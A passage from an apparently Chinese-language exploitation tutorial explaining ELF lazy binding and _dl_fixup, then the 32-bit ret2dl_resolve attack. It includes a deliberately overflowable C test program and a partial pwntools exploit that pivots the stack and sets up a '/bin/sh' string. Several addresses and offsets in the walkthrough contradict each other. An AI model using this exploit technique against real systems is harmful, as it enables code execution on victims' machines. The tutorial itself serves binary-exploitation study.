class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>    Elf32_Sword     d_tag<span class="token punctuation">;</span>    <span class="token keyword">union</span> <span class="token punctuation">{</span>        Elf32_Word  d_val<span class="token punctuation">;</span>        Elf32_Addr  d_ptr<span class="token punctuation">;</span>    <span class="token punctuation">}</span> d_un<span class="token punctuation">;</span><span class="token punctuation">}</span> Elf32_Dyn<span class="token punctuation">;</span><span class="token keyword">extern</span> Elf32_Dyn_DYNAMIC<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>Elf32_Dyn结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。下面给出和延迟绑定相关的类型值的定义。</p><ul><li><p>d_tag类型                     d_un的定义</p></li><li><p>#define DT_STRTAB 5            动态链接字符串表的地址，d_ptr表示.dynstr的地址 (Address of string table)</p></li><li><p>#define DT_SYMTAB 6         动态链接符号表的地址，d_ptr表示.dynsym的地址 (Address of symbol table)</p></li><li><p>#define DT_JMPREL 23         动态链接重定位表的地址,d_ptr表示.rel.plt的地址 (Address of PLT relocs)</p></li><li><p>#define DT_RELENT 19         单个重定位表项的大小，d_val表示单个重定位表项大小 (Size of one Rel reloc )</p></li><li><p>#define DT_SYMENT 11         单个符号表项的大小，d_val表示单个符号表项大小 (Size of one symbol table entry )<br>如上图所示，可以看到字符串表.dynstr的地址为0x804822c，符号表.dynsym地址为0x80481cc，其单个符号表项的大小为16，重定位表.rel.plt的地址为 0x80482d8，其单个重定位表项的大小为8<br>.rel.plt重定位表中包含了需要重定位的函数的信息，其也是一个结构体数组，结构体Elf32_Rel定义如下，其中r_offset表示got表地址，即动态解析函数后真正的函数地址需要填入的地方，r_info由两部分构成，r_info&gt;&gt;8表示该函数对应在符号表.dynsym中的下标，r_info&amp;0xff则表示重定位类型。：<br>（&gt;&gt;或&lt;&lt;就是将其二进制数据右移或左移，用0补齐）</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>  Elf32_Addr        r_offset<span class="token punctuation">;</span>对于可执行文件，此值为虚拟地址  Elf32_Word       r_info<span class="token punctuation">;</span>用于符号表索引<span class="token punctuation">}</span> Elf32_Rel<span class="token punctuation">;</span></code></pre></li></ul><p>查看一下重定位表0x8048298：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10x 0x80482980x8048298:    0x0804a00c    0x00000107    0x0804a010    0x000003070x80482a8 <span class="token operator">&lt;</span>_init<span class="token operator">></span>:    0x08ec8353    0x0000afe80x4fc38100    0x8b00001d0x80482b8 <span class="token operator">&lt;</span>_init+16<span class="token operator">></span>:    0xfffffc83    0x74c085ffgdb-peda$ </code></pre><p>所以0x0804a00c就是r_offset中的数据 ，0x00000107是r_info中的数据</p><p>再用readelf -r来查看程序的重定位表：</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -r test1重定位节 <span class="token string">'.rel.dyn'</span> at offset 0x290 contains 1 entry: 偏移量     信息    类型              符号值      符号名称08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__重定位节 <span class="token string">'.rel.plt'</span> at offset 0x298 contains 2 entries: 偏移量     信息    类型              符号值      符号名称0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.00804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0偏移量即r_offset ,信息即r_info</code></pre><p>可以看到重定位表.rel.plt为一个Elf32_Rel结构体数组，demo程序中该数组包含三个元素，第一个是read的重定位表项Elf32_Rel结构体，第二个是<strong>stack_chk_fail，第三个是</strong>libc_start_main。read的重定位表r_offset为0x0804a00c，为read的got地址，即在动态解析函数完成后，将read的函数地址填入到r_offset为0x0804a00c中。r_info为0x00000107表示read函数的符号表为.dynsym数组中的0x00000107&gt;&gt;8（即0x1）个元素，它的类型为0x00000107&amp;0xff（即0x7）对应为R_386_JUMP_SLOT类型。</p><p>继续来看看dynsym节，由上文，它也是一个结构体Elf32_Sym数组，其定义如下：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  Elf32_Word    st_name<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//符号名，是相对.dynstr起始的偏移</span>  Elf32_Addr    st_value<span class="token punctuation">;</span>  Elf32_Word    st_size<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对于导入函数符号而言，它是0x12</span>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span>  Elf32_Section st_shndx<span class="token punctuation">;</span><span class="token punctuation">}</span>Elf32_Sym<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//对于导入函数符号而言，其他字段都是0</span></code></pre><p>其中st_name指向的是函数名称在.dynstr表中的偏移。在dynamic段中我们知道了符号表.dynsym地址为0x80481cc，查看它的值：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10wx 0x80481cc0x80481cc:    0x00000000    0x00000000    0x00000000    0x000000000x80481dc:    0x0000001a    0x00000000    0x00000000    0x000000120x80481ec:    0x0000003b    0x00000000gdb-peda$ </code></pre><p>同样的也可以用readelf -s查看符号表结构体</p><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/Freebuf$ readelf -s test1Symbol table <span class="token string">'.dynsym'</span> contains 5 entries:   Num:    Value  Size Type    Bind   Vis      Ndx Name     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND      1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 <span class="token punctuation">(</span>2<span class="token punctuation">)</span>     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 <span class="token punctuation">(</span>2<span class="token punctuation">)</span>     4: 080484ec     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_usednum 就是.rel.plt结构体中的r_info<span class="token operator">>></span>8,是相对.dynstr起始的偏移,其他数值以此类推显然read相对于dynsym的偏移为1</code></pre><p>果然dynsym第一个元素为read函数的Elf32_Sym结构体。再回到.dynsym地址0x80481cc：第一行就是dynsym表中的第0个结构体的数值内容，第二行就是read函数结构体的数值内容。这两行显然相差16字节，符合(SYMENT)      单个符号表大小  16字节。</p><p>所以read结构体的st_name对应的是0x0000001a，即read字符串应该在.dynstr表偏移为0x2b的地方，由dynamic我们知道了.dynstr表的地址为地址为0x804821c，去验证下看其偏移0x1a是否为read字符串：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ x/10s 0x804821c0x804821c:    <span class="token string">""</span>0x804821d:    <span class="token string">"libc.so.6"</span>0x8048227:    <span class="token string">"_IO_stdin_used"</span>0x8048236:    <span class="token string">"read"</span>0x804823b:    <span class="token string">"__libc_start_main"</span>0x804824d:    <span class="token string">"GLIBC_2.0"</span>0x8048257:    <span class="token string">"__gmon_start__"</span>0x8048266:    <span class="token string">""</span>0x8048267:    <span class="token string">""</span>0x8048268:    <span class="token string">"\002"</span>gdb-peda$ x/s 0x804821c+0x1a0x8048236:    <span class="token string">"read"</span>gdb-peda$ </code></pre><p>可以看到确实如此。</p><h3 id="大概流程："><a href="#大概流程：" class="headerlink" title="大概流程："></a>大概流程：</h3><ul><li>可以先通过dynamic段获取各个表的地址，包括有字符串表.dynstr的地址为0x804822c，符号表.dynsym地址为0x80481cc，其单个符号表项的大小为16，重定位表.rel.plt的地址为 0x80482d8，其单个重定位表项的大小为8。</li><li>read函数为.rel.plt表中的第一个元素，定位它的重定位表项，知道了read函数的r_offset为0x0804a00c，以及它在符号表中的下标为0x000001，它的类型为0x7，R_386_JUMP_SLOT。</li><li>由0x000001知道了read函数的符号表是.dynsym第二个元素，获取到该结构体，得到了它对应的st_name对应的是0x0000001b，即获取了read字符串应该在.dynstr表偏移为0x1b的地方。</li><li>最后调用函数解析匹配read字符串所对应的函数地址，将其填至r_offset为0x0804a00c，即read的got地址中。</li></ul><h3 id="进入-dl-fixup"><a href="#进入-dl-fixup" class="headerlink" title="进入_dl_fixup:"></a>进入_dl_fixup:</h3><p>有了前面的基础，现在可以跟进去_dl_fixup，我们知道在调用_dl_runtime_resolve函数之前压入到栈中的参数是0，以及got+4中的值，参考下面_dl_fixup的源码，根据参数列表，知道了眼入栈中的0为reloc_arg，got+4中的值为struct link_map *l，函数源码在/elf/dl-runtime.c中：</p><pre class=" language-c"><code class="language-c"><span class="token function">_dl_fixup</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> link_map <span class="token operator">*</span>l<span class="token punctuation">,</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//获取符号表地址</span>  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token keyword">const</span> symtab<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_SYMTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取字符串表地址</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strtab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_STRTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取函数对应的重定位表结构地址</span>  <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取函数对应的符号表结构地址</span>  <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//得到函数对应的got地址，即真实函数地址要填回的地址</span>  <span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> rel_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr <span class="token operator">+</span> reloc<span class="token operator">-></span>r_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>  DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT</span>  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* Look up the target symbol.  If the normal lookup rules are not      used don't look in the global scope.  */</span>   <span class="token comment" spellcheck="true">//需要绕过</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token comment" spellcheck="true">// 接着通过strtab+sym->st_name找到符号表字符串</span>      result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span> <span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-></span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-></span>l_scope<span class="token punctuation">,</span>                    version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      <span class="token comment" spellcheck="true">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>result<span class="token punctuation">,</span>                   sym <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token function">LOOKUP_VALUE_ADDRESS</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span>                      <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load     address) is also known.  */</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment" spellcheck="true">// 最后把value写入相应的GOT表条目rel_addr中</span>  <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到_dl_fixup函数就如上面描述的过程一般，去定位结构体，最终获取read字符串去libc中找到相应的函数地址并填回到got表中。</p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>调用函数时，call func@plt，plt表内容如下：</p><pre class=" language-bash"><code class="language-bash">func@plt:jmp *<span class="token punctuation">(</span>func@GOT<span class="token punctuation">)</span>   //仍然首先进行GOT跳转，尝试是否是第一次链接push n        //压入需要地址绑定的符号在重定位表中的下标jmp PLT0    //跳转到 PLT0</code></pre><p>由于是第一次调用，func@GOTgot表中的值为jmp *(func@GOT)指令的下一条地址，即push n的地址，接着程序会执行push n; jmp PLT0，n则为该函数在.rel.plt表中的偏移。接着去看PLT0的指令为：<br>push *(got+4)<br>jmp *(got+8)</p><p>其中got+4存储的是link_map的地址，got+8存储的是_dl_runtime_resolve函数的地址。进入到_dl_runtime_resolve函数后，函数会调用_dl_fixup函数，根据源码分析，可以看到该函数功能为：</p><ul><li>程序先从第一个参数link_map获取字符串表.dynstr、符号表.dynsym以及重定位表.rel.plt的地址，</li><li>通过第二个参数n即.rel.plt表中的偏移reloc_arg加上.rel.plt的地址获取函数对应的重定位结构的位置，从而获取函数对应的r_offset以及在符号表中的下标r_info&gt;&gt;8。</li><li>根据符号表地址以及下标获取符号结构体，获得了函数符号表中的st_name，即函数名相对于字符串表.dynstr的偏移。</li><li>最后可得到函数名的字符串，然后去libc中匹配函数名，找到相应的函数并将地址填回到r_offset即函数got表中，延迟绑定完成。</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>32位的ret2dl_resolve<br>原理<br>ret2dl_resolve的适用场景是在无法泄露程序地址时，通过拦截延迟绑定的过程，实现对函数地址解析过程的劫持，使得最终解析出来的函数为特定函数的函数地址，从而实现无泄露达到特定函数调用的目的。<br>32位ELF程序ret2dl_resolve攻击方法，目前最为普遍的是伪造reloc_arg，即伪造重定位表的下标实现相关的利用，具体包括如下步骤：</p><ul><li>伪造reloc_arg，使得reloc_arg加上.rel.plt的地址指向可控的地址，在该地址可伪造恶意的Elf32_Rel结构体。</li><li>伪造Elf32_Rel结构体中的r_offset指向某一可写地址，最终函数地址会写入该地址处；伪造r_info&amp;0xff为0x7，因为类型需为ELF_MACHINE_JMP_SLOT以绕过类型验证；伪造r_info&gt;&gt;8，使得r_info&gt;&gt;8加上.dynsym地址指向可控的地址，并在该地址伪造符号表结构体Elf32_Sym。</li><li>伪造Elf32_Sym结构体中的st_name，使得.dynstr的地址加上该值指向可控地址，并在该地址处写入特定函数的函数名入system。</li><li>最终系统通过函数名匹配，定位到特定函数地址，获取该地址并写入到伪造的r_offset中，实现了函数地址的获取。</li></ul><p>需要注意一点的是dl_fixup中还存在以下一段代码：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token keyword">struct</span> r_found_version <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>如果reloc-&gt;r_info伪造不当，会使得ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff偏大，导致version = &amp;l-&gt;l_versions[ndx]出现访存错误，因此伪造的reloc-&gt;r_info，最好使得ndx为0，即vernum[reloc-&gt;r_info]为0。</p><p><img src="https://s1.ax1x.com/2020/08/17/dnQOQH.png" alt=""><br><img src="https://s1.ax1x.com/2020/08/17/dnQXyd.png" alt=""></p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token comment" spellcheck="true">//gcc -m32 -fno-stack-protecor -no-pie test2.c -o test2</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Welcome to the Crazy World!\n"</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出点为：112<br>利用思路：<br>1.控制eip为PLT[0]的地址，只需传递一个index_arg参数<br>2.控制index_arg的大小，使reloc的位置落在可控地址内<br>3.伪造reloc的内容，使sym落在可控地址内<br>4.伪造sym的内容，使name落在可控地址内<br>5.伪造name为任意库函数，如system</p><h3 id="step1："><a href="#step1：" class="headerlink" title="step1："></a>step1：</h3><p>直接返回到write@plt</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">112</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>ppp_ret <span class="token operator">=</span> <span class="token number">0x08048659</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>pop_ebp_ret <span class="token operator">=</span> <span class="token number">0x0804865b</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x08048465</span>  <span class="token comment" spellcheck="true">#Using Ropgadget</span>stack_size <span class="token operator">=</span> <span class="token number">0x400</span>  <span class="token comment" spellcheck="true">#fake chain from bss_addr+0x400</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0804a028</span> base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_size  <span class="token comment" spellcheck="true">#fake chain addr</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test2'</span><span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offsetpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#input fake chain </span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>ppp_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#balance the stack</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#栈迁移</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebp_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#base_stage pop ==>ebp</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov esp, ebp ; pop ebp ;make esp==>base_stage</span><span class="token comment" spellcheck="true">#gdb.attach(r)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print r.recv()</span>cmd <span class="token operator">=</span> <span class="token string">'/bin/sh'</span>payload2 <span class="token operator">=</span> <span class="token string">'AAAA'</span>  <span class="token comment" spellcheck="true">#response leave-> pop ebp make esp==>write_plt</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment" spellcheck="true">#ret_addr meaningless</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span> payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>len<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> cmd<span class="token operator">+</span><span class="token string">'\x00'</span>  <span 